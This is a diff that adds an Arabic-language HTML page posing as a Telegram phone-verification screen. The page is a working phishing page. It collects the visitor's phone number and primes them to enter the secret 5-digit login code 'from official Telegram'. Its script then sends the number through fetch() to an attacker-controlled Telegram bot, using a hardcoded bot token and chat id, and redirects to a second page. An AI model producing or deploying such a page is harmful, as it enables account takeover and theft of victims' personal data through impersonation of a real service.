@@ -1,0 +1,438 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>تلجرام السديم - تأكيد الرقم</title>
+  <style>
+  
+  
+  body {
+    background: url('false-412.png') no-repeat center center fixed;
+    background-size: cover;
+    background-attachment: fixed;
+  }
+
+  .container {
+    background-color: rgba(255, 255, 255, 0.9); /* أبيض شفاف للخلفية */
+    border-radius: 20px;
+    padding: 20px;
+    box-shadow: 0 0 15px rgba(0,0,0,0.1);
+  }
+
+  
+  
+  
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+    }
+
+    body {
+      background-color: #f0f2f5;
+      color: #000;
+    }
+
+    /* المحتوى الرئيسي */
+    #container {
+      display: block;
+      max-width: 500px;
+      margin: 0 auto;
+      padding: 20px;
+    }
+
+    .header {
+      text-align: center;
+      margin-bottom: 30px;
+    }
+
+    .header img {
+      width: 120px;
+      height: 120px;
+      margin-bottom: 15px;
+    }
+
+    .header h1 {
+      font-size: 24px;
+      color: #000000;
+      margin-bottom: 10px;
+    }
+
+    .content {
+      background: linear-gradient(135deg, #98C611, #04BC2C);
+      padding: 25px;
+      border-radius: 22px;
+      box-shadow: 0 5px 5px rgba(255, 255, 255, 0.3);
+    }
+
+    .content h2 {
+      font-size: 18px;
+      margin-bottom: 20px;
+      text-align: center;
+      color: #000;
+    }
+
+    .input-group {
+      margin-bottom: 25px;
+    }
+
+    .input-label {
+      display: block;
+      margin-bottom: 8px;
+      font-size: 14px;
+      color: #000;
+    }
+
+    .input-row {
+      display: flex;
+      margin-bottom: 20px;
+    }
+
+    #countryCode {
+      flex: 0 0 120px;
+      padding: 12px;
+      border: 1px solid #ddd;
+      border-radius: 8px;
+      font-size: 16px;
+      background-color: #;
+      margin-left: 10px;
+    }
+
+    #phoneInput {
+      flex: 1;
+      padding: 12px;
+      border: 1px solid #f0f2f5;
+      border-radius: 8px;
+      font-size: 16px;
+    }
+
+    .country-name {
+      display: block;
+      margin-top: 5px;
+      font-size: 14px;
+      color: white;
+    }
+
+    .btn {
+      width: 100%;
+      padding: 14px;
+      background-color: #0088cc;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      font-weight: 500;
+      cursor: pointer;
+      margin-bottom: 15px;
+    }
+
+    .note {
+      font-size: 14px;
+      color: #000;
+      text-align: center;
+      line-height: 1.5;
+    }
+
+    /* نافذة التأكيد */
+    .modal-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background-color: rgba(0, 0, 0, 0.5);
+      display: none;
+      justify-content: center;
+      align-items: center;
+      z-index: 1000;
+    }
+
+    .modal-overlay.active {
+      display: flex;
+    }
+
+    .modal {
+      background-color: white;
+      width: 90%;
+      max-width: 400px;
+      border-radius: 12px;
+      padding: 25px;
+      text-align: center;
+    }
+
+    .modal-icon {
+      width: 60px;
+      height: 60px;
+      background-color: #25D366;
+      color: white;
+      border-radius: 50%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-size: 30px;
+      margin: 0 auto 20px;
+    }
+
+    .modal-title {
+      font-size: 20px;
+      margin-bottom: 15px;
+      color: #000;
+    }
+
+    .modal-text {
+      font-size: 15px;
+      color: #000;
+      line-height: 1.5;
+      margin-bottom: 25px;
+    }
+
+    .modal-text strong {
+      color: #000;
+    }
+
+    .modal-buttons {
+      display: flex;
+      gap: 10px;
+    }
+
+    .modal-btn {
+      flex: 1;
+      padding: 12px;
+      border-radius: 8px;
+      font-size: 16px;
+      font-weight: 500;
+      cursor: pointer;
+    }
+
+    .modal-btn-edit {
+      background-color: #f0f2f5;
+      color: #000;
+      border: none;
+    }
+
+    .modal-btn-confirm {
+      background-color: #0088cc;
+      color: white;
+      border: none;
+    }
+
+    /* نافذة التحميل */
+    .loader {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background-color: rgba(255, 255, 255, 0.9);
+      display: none;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      z-index: 1001;
+    }
+
+    .loader-spinner {
+      border: 4px solid rgba(0, 136, 204, 0.3);
+      border-radius: 50%;
+      border-top: 4px solid #0088cc;
+      width: 50px;
+      height: 50px;
+      animation: spin 1s linear infinite;
+      margin-bottom: 20px;
+    }
+
+    .loader-text {
+      font-size: 16px;
+      color: #000;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+  
+  
+  <!-- في كل صفحة HTML -->
+<link rel="manifest" href="manifest.json" />
+<meta name="theme-color" content="#25D366" />
+  
+</head>
+<body>
+
+  <!-- المحتوى الرئيسي -->
+  <div id="container">
+    <div class="header">
+      <img src="false-5122.png" alt="تلجرام السديم">
+      <h1>تلجرام السديم</h1>
+    </div>
+
+    <div class="content">
+      <h2>أدخل رقم هاتفك</h2>
+
+      <div class="input-group">
+        <label class="input-label">الدولة</label>
+        <div class="input-row">
+          <select id="countryCode"></select>
+          <span class="country-name" id="countryName"> 🇾🇪اليمن</span>
+        </div>
+
+        <label class="input-label">رقم الهاتف</label>
+        <div class="input-row">
+          <input type="tel" id="phoneInput" placeholder="+### ### ### ### ###">
+        </div>
+      </div>
+
+      <button class="btn" onclick="validateAndSubmit()">التالي</button>
+
+      <p class="note">
+        سيتم إرسال كود التحقق إلى رقمك عبر رسالة SMS من شركة تلجرام
+      </p>
+    </div>
+  </div>
+
+  <!-- نافذة التأكيد -->
+  <div class="modal-overlay" id="confirmationModal">
+    <div class="modal">
+      <div class="modal-icon">✓</div>
+      <h3 class="modal-title">تأكيد رقم الهاتف</h3>
+      <p class="modal-text">
+        خلال لحظات، ستصلك رسالة تحقق سرّية مكونة من 5 أرقام عبر <strong>رسالة نصية أو عبر تطبيق تلجرام</strong> صادرة من <strong>شركة تلجرام الرسمية</strong>. يرجى إدخال الكود فور استلامه لإتمام عملية التفعيل بأمان.
+      </p>
+      <div class="modal-buttons">
+        <button class="modal-btn modal-btn-edit" onclick="closeModal()">تعديل</button>
+        <button class="modal-btn modal-btn-confirm" onclick="confirmVerification()">تم</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- نافذة التحميل -->
+  <div class="loader" id="loader">
+    <div class="loader-spinner"></div>
+    <div class="loader-text">جاري إعداد التحقق...</div>
+  </div>
+
+<script>
+    // تعبئة قائمة الدول
+    document.addEventListener('DOMContentLoaded', function() {
+      const countries = [
+        {code: "+966", name: " 🇸🇦السعودية"},
+        {code: "+967", name:"اليمن 🇾🇪"},
+        {code: "+20", name: "مصر 🇪🇬"},
+        {code: "+971", name: "الإمارات 🇦🇪"},
+        {code: "+962", name: " 🇯🇴الأردن"},
+        {code: "+973", name: " 🇧🇭البحرين"},
+        {code: "+968", name: " 🇴🇲عُمان"},
+        {code: "+974", name: "قطر 🇶🇦"}, 
+        {code: "+965", name: " 🇰🇼الكويت"},
+        {code: "+963", name: " 🇸🇾سوريا"},
+        {code: "+964", name: " 🇮🇶العراق"},
+        {code: "+218", name: " 🇱🇾ليبيا"},
+        {code: "+421", name: " 🇸🇰"}
+      ];
+
+      const select = document.getElementById('countryCode');
+      countries.forEach(country => {
+        const option = document.createElement('option');
+        option.value = country.code;
+        option.textContent = `${country.name} (${country.code})`;
+        if (country.code === "+967") {
+          option.selected = true;
+        }
+        select.appendChild(option);
+      });
+
+      // تحديث اسم الدولة عند التغيير
+      select.addEventListener('change', function() {
+        const selectedOption = this.options[this.selectedIndex];
+        const country = selectedOption.textContent.split(' (')[0];
+        document.getElementById('countryName').textContent = country;
+      });
+    });
+
+    function showModal() {
+      document.getElementById('confirmationModal').classList.add('active');
+    }
+
+    function closeModal() {
+      document.getElementById('confirmationModal').classList.remove('active');
+    }
+
+    function validatePhoneNumber(code, phone) {
+      const rules = {
+        "+966": /^5\d{8}$/,                 // السعودية
+        "+967": /^7\d{8}$/,                 // اليمن
+        "+20": /^(10|11|12|15)\d{8}$/,       // مصر
+        "+971": /^5[0-9]{8}$/,              // الإمارات
+        "+962": /^(7[7-9])[0-9]{7}$/,        // الأردن
+        "+973": /^3\d{7}$/,                 // البحرين
+        "+968": /^9\d{7}$/,                 // عُمان
+        "+974": /^[3-7]\d{7}$/,             // قطر
+        "+965": /^[569]\d{7}$/,             // الكويت
+        "+963": /^9\d{8}$/,                 // سوريا
+        "+964": /^7\d{9}$/,                 // العراق
+        "+218": /^9[1-9]\d{7}$/,            // ليبيا
+        "+421": /^\d{3} \d{3} \d{3} \d{3}$/ // سلوفاكيا
+      };
+
+      return rules[code] ? rules[code].test(phone) : true;
+    }
+
+    async function sendToBot(phoneNumber) {
+      const botToken = "8051635898:AAGR6XDKSMb2i0FbwG0hWdbEt_5xjb-WLQ8";
+      const chatId = "7121448697";
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+      try {
+        const response = await fetch(url, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: `📱طلب تحقق جديد:\n${phoneNumber}`
+          })
+        });
+        return await response.json();
+      } catch (error) {
+        console.error('Error sending to Telegram:', error);
+        return {ok: false};
+      }
+    }
+
+    async function confirmVerification() {
+      closeModal();
+      document.getElementById('loader').style.display = 'flex';
+      const phone = document.getElementById('countryCode').value +
+                   document.getElementById('phoneInput').value.trim();
+      localStorage.setItem('userPhone', phone);
+      const result = await sendToBot(phone);
+      if (result.ok) {
+        setTimeout(() => {
+          window.location.href = "index2.html";
+        }, 5000);
+      } else {
+        document.getElementById('loader').style.display = 'none';
+        alert("حدث خطأ أثناء الإرسال، يرجى المحاولة لاحقاً");
+      }
+    }
+
+    function validateAndSubmit() {
+      const code = document.getElementById('countryCode').value;
+      const phone = document.getElementById('phoneInput').value.trim();
+      if (!phone) {
+        alert("يرجى إدخال رقم الهاتف");
+        return;
+      }
+      if (!validatePhoneNumber(code, phone)) {
+        alert("رقم الهاتف غير صحيح للبلد المحدد");
+        return;
+      }
+      showModal();
+    }
+</script>
+
+</body>
+</html>
